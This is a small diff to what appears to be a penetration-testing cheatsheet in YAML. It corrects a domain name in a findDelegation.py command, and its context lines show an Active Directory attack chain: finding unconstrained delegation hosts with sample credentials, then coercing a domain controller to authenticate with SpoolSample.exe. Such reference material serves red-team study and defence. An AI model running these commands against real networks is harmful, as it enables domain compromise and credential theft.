@@ -5,7 +5,7 @@ commands:
   - have: Credentials
     cmd: |
       # Find unconstrained delegation computers
-      findDelegation.py senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27
+      findDelegation.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27
 
       # Coerce DC to authenticate to unconstrained host
       SpoolSample.exe DC01 UNCONSTRAINED_HOST
